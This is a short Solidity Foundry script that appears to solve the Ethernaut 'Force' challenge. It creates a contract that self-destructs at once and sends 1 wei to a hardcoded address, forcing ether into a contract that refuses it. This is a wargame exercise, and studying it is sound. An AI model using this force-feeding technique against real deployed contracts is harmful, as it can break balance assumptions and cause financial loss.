// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/Force.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ToBeDestructed{
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract ForceSolution is Script {
  
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ToBeDestructed{value: 1 wei}(payable(0x18f80a0E19B15e669554B8175EbBb9aC726887db)); 
        vm.stopBroadcast();
    }
}

